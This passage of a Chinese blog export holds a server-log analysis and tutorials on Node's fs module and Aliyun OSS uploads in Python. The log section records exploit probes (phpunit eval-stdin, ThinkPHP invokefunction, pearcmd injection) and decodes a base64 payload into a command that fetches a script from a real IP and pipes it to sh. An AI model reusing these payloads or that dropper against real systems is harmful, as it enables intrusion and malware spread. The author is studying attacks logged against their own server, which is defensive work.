04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/index.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&quot;s&quot;: &quot;/index/\\think\\app/invokefunction&quot;, &quot;function&quot;: &quot;call_user_func_array&quot;, &quot;vars[0]&quot;: &quot;md5&quot;, &quot;vars[1][]&quot;: &quot;Hello&quot;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/index.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/public/index.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&quot;s&quot;: &quot;/index/\\think\\app/invokefunction&quot;, &quot;function&quot;: &quot;call_user_func_array&quot;, &quot;vars[0]&quot;: &quot;md5&quot;, &quot;vars[1][]&quot;: &quot;Hello&quot;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/public/index.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:21][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/index.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&quot;lang&quot;: &quot;../../../../../../../../usr/local/lib/php/pearcmd&quot;, &quot; config-create /&quot;: &quot;&quot;, &quot;/&lt;?echo(md5(\&quot;hi\&quot;));?&gt; /tmp/index1.php&quot;: &quot;&quot;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;</code></pre><h2 id="内容解析"><a href="#内容解析" class="headerlink" title="内容解析"></a>内容解析</h2><pre><code class="shell">base64_decode(\&quot;WD0kKGN1cmwgaHR0cDovLzE1NC4yMTYuMTcuMzAvYXogfHwgd2dldCBodHRwOi8vMTU0LjIxNi4xNy4zMC9heiAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA&quot;: &quot;\&quot;));</code></pre><p>结果为</p><pre><code class="shell">X=$(curl http://154.216.17.30/az || wget http://154.216.17.30/az -O-); echo &quot;$X&quot; | sh -s cve_2024_4577.selfrep</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ServerLog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node fs文件系统模块</title>
      <link href="/2024/10/28/frontend-node-fs/"/>
      <url>/2024/10/28/frontend-node-fs/</url>
      
        <content type="html"><![CDATA[<blockquote><p>fs模块是Node.js官方提供的用于操作文件的模块。</p></blockquote><h2 id="导入fs模块"><a href="#导入fs模块" class="headerlink" title="导入fs模块"></a>导入fs模块</h2><p>在使用fs模块的时候首先要在JS代码中导入fs模块</p><pre><code class="javascript">const fs = require(&#39;fs&#39;)</code></pre><h2 id="读取文件内容"><a href="#读取文件内容" class="headerlink" title="读取文件内容"></a>读取文件内容</h2><p>fs.readFils(path, options, callback(error, content))</p><ul><li>path 要读取文件的路径</li><li>options 读取的编码方式，一般为utf8</li><li>callback 回调函数</li><li><ul><li>error 错误信息，没有错误返回Null</li></ul></li><li><ul><li>content 读取的内容，如果读取错误返回undefined</li></ul></li></ul><h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><pre><code class="javascript">const fs = require(&#39;fs&#39;)fs.readFile(&#39;test.txt&#39;, &#39;utf8&#39;, (error, content) =&gt; &#123;    console.log(&#39;error&#39;, error)    console.log(&#39;content&#39;, content)&#125;)</code></pre><h3 id="判定读取成功还是失败"><a href="#判定读取成功还是失败" class="headerlink" title="判定读取成功还是失败"></a>判定读取成功还是失败</h3><pre><code class="javascript">fs.readFile(&#39;test.txt&#39;, &#39;utf8&#39;, (error, content) =&gt; &#123;    if (error) &#123;        console.log(&#39;文件读取失败：&#39;, error.message)        return    &#125;    console.log(&#39;文件读取成功：&#39;, content)&#125;)</code></pre><h2 id="写入文件内容"><a href="#写入文件内容" class="headerlink" title="写入文件内容"></a>写入文件内容</h2><p>fs.writeFile(path, data, options, callback(error))</p><ul><li>path 要写入文件的路径</li><li>data 要写入的内容</li><li>options 读取的编码方式，一般为utf8</li><li>callback 回调函数</li><li><ul><li>error 错误信息，没有错误返回Null<br>ps：使用fs.writeFile()写入内容成功后，新内容会覆盖掉就内容</li></ul></li></ul><h3 id="写入成功"><a href="#写入成功" class="headerlink" title="写入成功"></a>写入成功</h3><pre><code class="javascript">const fs = require(&#39;fs&#39;)fs.writeFile(&#39;test.txt&#39;, &#39;Hello World&#39;, &#39;utf8&#39;, (error) =&gt; &#123;    console.log(&#39;error&#39;, error)&#125;)</code></pre><h3 id="判定读取成功还是失败-1"><a href="#判定读取成功还是失败-1" class="headerlink" title="判定读取成功还是失败"></a>判定读取成功还是失败</h3><pre><code class="javascript">fs.writeFile(&#39;test.txt&#39;, &#39;Hello World&#39;, &#39;utf8&#39;, (error) =&gt; &#123;    if (error) &#123;        console.log(&#39;文件写入失败：&#39;, error.message)        return    &#125;    console.log(&#39;文件写入成功：&#39;)&#125;)</code></pre><h2 id="读取整理后写入"><a href="#读取整理后写入" class="headerlink" title="读取整理后写入"></a>读取整理后写入</h2><pre><code class="javascript">const fs = require(&#39;fs&#39;) fs.readFile(&#39;test.txt&#39;, &#39;utf8&#39;, (err, dataStr) =&gt; &#123;    dataStr = dataStr.replaceAll(&#39;=&#39;, &#39;：&#39;)    dataStr = dataStr.replaceAll(&#39; &#39;, &#39;\n&#39;)    fs.writeFile(&#39;test-ok.txt&#39;, dataStr, &#39;utf8&#39;, (err) =&gt; &#123;        console.log(&#39;写入成功&#39;)    &#125;)&#125;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>阿里云OSS对象存储接入</title>
      <link href="/2024/10/23/python-alioss/"/>
      <url>/2024/10/23/python-alioss/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Python接入阿里云OSS对象存储基本内容，暂时只定了Windows和Linux下的接入处理，更多内容请参考阿里云OSS接入官方文档。</p></blockquote><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="支持环境"><a href="#支持环境" class="headerlink" title="支持环境"></a>支持环境</h3><p>OSS Python SDK适用于Python 2.6、2.7、3.3、3.4、3.5、3.6、3.7、3.8及以上版本</p><blockquote><p>ps: windows系统下安装Python SDK时，需确保Visual C++版本为15.0或以上</p></blockquote><h3 id="当前使用环境"><a href="#当前使用环境" class="headerlink" title="当前使用环境"></a>当前使用环境</h3><p>名称 | 版本 | 备注<br>— | —<br>python | 3.11.1<br>pip | 24.0<br>python-devel | 3.11 | CentOS需要安装，Windows不需要</p><h2 id="OSS-Python-SDK"><a href="#OSS-Python-SDK" class="headerlink" title="OSS Python SDK"></a>OSS Python SDK</h2><h3 id="SDK下载"><a href="#SDK下载" class="headerlink" title="SDK下载"></a>SDK下载</h3><p><a href="https://github.com/aliyun/aliyun-oss-python-sdk">通过GitHub下载</a><br><a href="https://github.com/aliyun/aliyun-oss-python-sdk/releases">历史版本下载</a></p><h3 id="SDK安装"><a href="#SDK安装" class="headerlink" title="SDK安装"></a>SDK安装</h3><h4 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h4><pre><code class="shell">pip3 install oss2</code></pre><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><ol><li>下载最新版本的OSS Python SDK，解压后进入目录，确认目录下有setup.py文件。</li><li>执行以下命令安装OSS Python SDK。</li></ol><pre><code class="shell">python3 setup.py install</code></pre><h3 id="验证SDK"><a href="#验证SDK" class="headerlink" title="验证SDK"></a>验证SDK</h3><ol><li>执行以下命进入Python环境。</li></ol><pre><code class="shell">python3</code></pre><ol start="2"><li>执行以下命令查看OSS Python SDK版本。</li></ol><pre><code class="shell">import oss2oss2.__version__</code></pre><ol start="3"><li>成功返回示例</li></ol><pre><code class="shell">&#39;2.18.3&#39;</code></pre><h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><h3 id="简单上传"><a href="#简单上传" class="headerlink" title="简单上传"></a>简单上传</h3><p>简单上传默认会覆盖同名Object</p><pre><code class="python"># -*- coding: utf-8 -*-import oss2import osfrom oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# yourEndpoint填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# 填写Bucket名称。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 必须以二进制的方式打开文件。# 填写本地文件的完整路径。如果未指定本地路径，则默认从示例程序所属项目对应本地路径中上传文件。with open(&#39;D:\\localpath\\examplefile.txt&#39;, &#39;rb&#39;) as fileobj:    # Seek方法用于指定从第1000个字节位置开始读写。上传时会从您指定的第1000个字节位置开始上传，直到文件结束。    fileobj.seek(1000, os.SEEK_SET)    # Tell方法用于返回当前位置。    current = fileobj.tell()    # 填写Object完整路径。Object完整路径中不能包含Bucket名称。    bucket.put_object(&#39;exampleobject.txt&#39;, fileobj)</code></pre><h3 id="表单上传"><a href="#表单上传" class="headerlink" title="表单上传"></a>表单上传</h3><p>通过表单上传的方式上传的Object大小不能超过5 GB。</p><pre><code class="python">import osfrom hashlib import sha1 as shaimport jsonimport base64import hmacimport datetimeimport time# 配置环境变量OSS_ACCESS_KEY_ID。access_key_id = os.environ.get(&#39;OSS_ACCESS_KEY_ID&#39;)# 配置环境变量OSS_ACCESS_KEY_SECRET。access_key_secret = os.environ.get(&#39;OSS_ACCESS_KEY_SECRET&#39;)# 将&lt;YOUR_BUCKET&gt;替换为Bucket名称。bucket = &#39;&lt;YOUR_BUCKET&gt;&#39;# host的格式为bucketname.endpoint。将&lt;YOUR_BUCKET&gt;替换为Bucket名称。将&lt;YOUR_ENDPOINT&gt;替换为OSS Endpoint，例如oss-cn-hangzhou.aliyuncs.com。host = &#39;https://&lt;YOUR_BUCKET&gt;.&lt;YOUR_ENDPOINT&gt;&#39;# 指定上传到OSS的文件前缀。upload_dir = &#39;user-dir-prefix/&#39;# 指定过期时间，单位为秒。expire_time = 3600def generate_expiration(seconds):    &quot;&quot;&quot;    通过指定有效的时长（秒）生成过期时间。    :param seconds: 有效时长（秒）。    :return: ISO8601 时间字符串，如：&quot;2014-12-01T12:00:00.000Z&quot;。    &quot;&quot;&quot;    now = int(time.time())    expiration_time = now + seconds    gmt = datetime.datetime.utcfromtimestamp(expiration_time).isoformat()    gmt += &#39;Z&#39;    return gmtdef generate_signature(access_key_secret, expiration, conditions, policy_extra_props=None):    &quot;&quot;&quot;    生成签名字符串Signature。    :param access_key_secret: 有权限访问目标Bucket的AccessKeySecret。    :param expiration: 签名过期时间，按照ISO8601标准表示，并需要使用UTC时间，格式为yyyy-MM-ddTHH:mm:ssZ。示例值：&quot;2014-12-01T12:00:00.000Z&quot;。    :param conditions: 策略条件，用于限制上传表单时允许设置的值。    :param policy_extra_props: 额外的policy参数，后续如果policy新增参数支持，可以在通过dict传入额外的参数。    :return: signature，签名字符串。    &quot;&quot;&quot;    policy_dict = &#123;        &#39;expiration&#39;: expiration,        &#39;conditions&#39;: conditions    &#125;    if policy_extra_props is not None:        policy_dict.update(policy_extra_props)    policy = json.dumps(policy_dict).strip()    policy_encode = base64.b64encode(policy.encode())    h = hmac.new(access_key_secret.encode(), policy_encode, sha)    sign_result = base64.b64encode(h.digest()).strip()    return sign_result.decode()def generate_upload_params():    policy = &#123;        # 有效期。        &quot;expiration&quot;: generate_expiration(expire_time),        # 约束条件。        &quot;conditions&quot;: [            # 未指定success_action_redirect时，上传成功后的返回状态码，默认为 204。            [&quot;eq&quot;, &quot;$success_action_status&quot;, &quot;200&quot;],            # 表单域的值必须以指定前缀开始。例如指定key的值以user/user1开始，则可以写为[&quot;starts-with&quot;, &quot;$key&quot;, &quot;user/user1&quot;]。            [&quot;starts-with&quot;, &quot;$key&quot;, upload_dir],            # 限制上传Object的最小和最大允许大小，单位为字节。            [&quot;content-length-range&quot;, 1, 1000000],            # 限制上传的文件为指定的图片类型            [&quot;in&quot;, &quot;$content-type&quot;, [&quot;image/jpg&quot;, &quot;image/png&quot;]]        ]    &#125;    signature = generate_signature(access_key_secret, policy.get(&#39;expiration&#39;), policy.get(&#39;conditions&#39;))    response = &#123;        &#39;policy&#39;: base64.b64encode(json.dumps(policy).encode(&#39;utf-8&#39;)).decode(),        &#39;ossAccessKeyId&#39;: access_key_id,        &#39;signature&#39;: signature,        &#39;host&#39;: host,        &#39;dir&#39;: upload_dir        # 可以在这里再自行追加其他参数    &#125;    return json.dumps(response)</code></pre><h3 id="上传回调"><a href="#上传回调" class="headerlink" title="上传回调"></a>上传回调</h3><ul><li>目前仅简单上传（PutObject）、表单上传（PostObject）、完成分片上传（CompleteMultipartUpload）操作支持使用上传回调。</li><li>上传回调旨在实现文件上传至OSS后，自动触发通知至业务服务器，以执行数据更新或发送通知等后续步骤。回调成功或失败不影响文件上传并保存至OSS。</li></ul><pre><code class="python"># -*- coding: utf-8 -*-import jsonimport base64import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# yourEndpoint填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# 填写Bucket名称。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 定义回调参数Base64编码函数。def encode_callback(callback_params):    cb_str = json.dumps(callback_params).strip()    return oss2.compat.to_string(base64.b64encode(oss2.compat.to_bytes(cb_str)))# 设置上传回调参数。callback_params = &#123;&#125;# 设置回调请求的服务器地址，例如http://oss-demo.aliyuncs.com:23450。callback_params[&#39;callbackUrl&#39;] = &#39;http://oss-demo.aliyuncs.com:23450&#39;#（可选）设置回调请求消息头中Host的值，即您的服务器配置Host的值。#callback_params[&#39;callbackHost&#39;] = &#39;yourCallbackHost&#39;# 设置发起回调时请求body的值。callback_params[&#39;callbackBody&#39;] = &#39;bucket=$&#123;bucket&#125;&amp;object=$&#123;object&#125;&#39;# 设置发起回调请求的Content-Type。callback_params[&#39;callbackBodyType&#39;] = &#39;application/x-www-form-urlencoded&#39;encoded_callback = encode_callback(callback_params)# 设置发起回调请求的自定义参数，由Key和Value组成，Key必须以x:开始。callback_var_params = &#123;&#39;x:my_var1&#39;: &#39;my_val1&#39;, &#39;x:my_var2&#39;: &#39;my_val2&#39;&#125;encoded_callback_var = encode_callback(callback_var_params)# 上传回调。params = &#123;&#39;x-oss-callback&#39;: encoded_callback, &#39;x-oss-callback-var&#39;: encoded_callback_var&#125;# 填写Object完整路径和字符串。Object完整路径中不能包含Bucket名称。result = bucket.put_object(&#39;examplefiles/exampleobject.txt&#39;, &#39;a&#39;*1024*1024, params)</code></pre><h3 id="上传进度条"><a href="#上传进度条" class="headerlink" title="上传进度条"></a>上传进度条</h3><pre><code class="python"># -*- coding: utf-8 -*-from __future__ import print_functionimport os, sysimport oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# 填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# yourBucketName填写存储空间名称。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;yourBucketName&#39;)# consumed_bytes表示已上传的数据量。# total_bytes表示待上传的总数据量。当无法确定待上传的数据长度时，total_bytes的值为None。def percentage(consumed_bytes, total_bytes):    if total_bytes:        rate = int(100 * (float(consumed_bytes) / float(total_bytes)))        print(&#39;\r&#123;0&#125;% &#39;.format(rate), end=&#39;&#39;)        sys.stdout.flush()# progress_callback为可选参数，用于实现进度条功能。bucket.put_object(&#39;yourObjectName&#39;, &#39;a&#39;*1024*1024, progress_callback=percentage)</code></pre><h3 id="推流上传"><a href="#推流上传" class="headerlink" title="推流上传"></a>推流上传</h3><ol><li>获取推流地址</li></ol><pre><code class="python"># -*- coding: utf-8 -*-import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# 填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# 填写存储空间名称，例如examplebucket。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 填写LiveChannel名称，例如test-channel。channel_name = &quot;test-channel&quot;channel_cfg = oss2.models.LiveChannelInfo(target = oss2.models.LiveChannelInfoTarget())channel = bucket.create_live_channel(channel_name, channel_cfg)publish_url = channel.publish_url# 生成RTMP推流的签名URL，并设置过期时间为3600秒。signed_publish_url = bucket.sign_rtmp_url(channel_name, &quot;playlist.m3u8&quot;, 3600)# 打印未签名推流地址。print(&#39;publish_url=&#39;+publish_url)# 打印签名推流地址。print(&#39;signed_publish_url=&#39;+signed_publish_url)</code></pre><ol start="2"><li>使用推流地址向OSS推送音视频数据。(ffmpeg示例)</li></ol><pre><code class="shell">ffmpeg -i 1.flv -c copy -f flv &quot;rtmp://examplebucket.oss-cn-hangzhou.aliyuncs.com/live/test-channel?playlistName=playlist.m3u8&amp;OSSAccessKeyId=LTAI********&amp;Expires=1688543369&amp;Signature=eqK8z0ZTSwznP7fkELy0ckt0Iv***&quot;</code></pre><h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><h3 id="简单下载"><a href="#简单下载" class="headerlink" title="简单下载"></a>简单下载</h3><p>简单下载指的是使用OSS API的GetObject接口，下载已上传的文件（Object），适用于一次HTTP请求交互即可完成下载的场景。</p><pre><code class="python"># -*- coding: utf-8 -*-import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 阿里云账号AccessKey拥有所有API的访问权限，风险很高。强烈建议您创建并使用RAM账号进行API访问或日常运维，请登录RAM控制台创建RAM账号。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# Endpoint以杭州为例，其它Region请按实际情况填写。# 填写Bucket名称，例如examplebucket。bucket = oss2.Bucket(auth, &#39;http://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 填写Object完整路径，完整路径中不包含Bucket名称，例如testfolder/exampleobject.txt。# 下载Object到本地文件，并保存到指定的本地路径D:\\localpath\\examplefile.txt。如果指定的本地文件存在会覆盖，不存在则新建。bucket.get_object_to_file(&#39;testfolder/exampleobject.txt&#39;, &#39;D:\\localpath\\examplefile.txt&#39;)</code></pre><h2 id="管理文件"><a href="#管理文件" class="headerlink" title="管理文件"></a>管理文件</h2><h3 id="列举文件"><a href="#列举文件" class="headerlink" title="列举文件"></a>列举文件</h3><p>存储空间（Bucket）内的文件（Object）默认按照字母序排列。您可以结合实际场景列举当前Bucket的所有Object、指定前缀的Object、指定个数的Object等。</p><pre><code class="python"># -*- coding: utf-8 -*-import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# 填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# 填写Bucket名称，例如examplebucket。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 列举Bucket下的所有文件。for obj in oss2.ObjectIteratorV2(bucket):    print(obj.key)</code></pre><h3 id="重命名文件"><a href="#重命名文件" class="headerlink" title="重命名文件"></a>重命名文件</h3><p>在OSS数据迁移或重组过程中，您可以通过重命名文件满足新的组织标准，确保命名一致性和结构准确性。</p><pre><code class="python"># -*- coding: utf-8 -*-import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# yourEndpoint填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。endpoint = &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;# 填写Bucket名称，例如examplebucket。bucket_name = &#39;examplebucket&#39;bucket = oss2.Bucket(auth, endpoint, bucket_name)# 填写不包含Bucket名称在内源Object的完整路径，例如srcobject.txt。src_object_name = &#39;srcobject.txt&#39;# 填写不包含Bucket名称在内目标Object的完整路径，例如destobject.txt。dest_object_name = &#39;destobject.txt&#39;# 将examplebucket下的srcobject.txt拷贝至同一Bucket下的destobject.txt。result = bucket.copy_object(bucket_name, src_object_name, dest_object_name)# 查看返回结果的状态。如果返回值为200，表示执行成功。print(&#39;result.status:&#39;, result.status)# 删除srcobject.txt。result_del = bucket.delete_object(src_object_name)# 查看返回结果的状态。如果返回值为204，表示执行成功。print(&#39;result.status:&#39;, result_del.status)</code></pre><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>以下仅列举常见SDK的删除单个文件的代码示例。关于其他SDK删除单个文件以及多个文件的代码示例，请参见官方SDK简介。</p><pre><code class="python"># -*- coding: utf-8 -*-import oss2from oss2.credentials import EnvironmentVariableCredentialsProvider# 从环境变量中获取访问凭证。运行本代码示例之前，请确保已设置环境变量OSS_ACCESS_KEY_ID和OSS_ACCESS_KEY_SECRET。auth = oss2.ProviderAuth(EnvironmentVariableCredentialsProvider())# yourEndpoint填写Bucket所在地域对应的Endpoint。以华东1（杭州）为例，Endpoint填写为https://oss-cn-hangzhou.aliyuncs.com。# 填写Bucket名称，例如examplebucket。bucket = oss2.Bucket(auth, &#39;https://oss-cn-hangzhou.aliyuncs.com&#39;, &#39;examplebucket&#39;)# 删除文件。# yourObjectName填写待删除文件的完整路径，完整路径中不包含Bucket名称，例如exampledir/exampleobject.txt。# 如需删除文件夹，请将yourObjectName设置为对应的文件夹名称。如果文件夹非空，则需要将文件夹下的所有文件删除后才能删除该文件夹。bucket.delete_object(&#39;exampledir/exampleobject.txt&#39;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OSS对象存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片转字符画</title>
      <link href="/2024/10/20/python-imagetostr/"/>
      <url>/2024/10/20/python-imagetostr/</url>
      
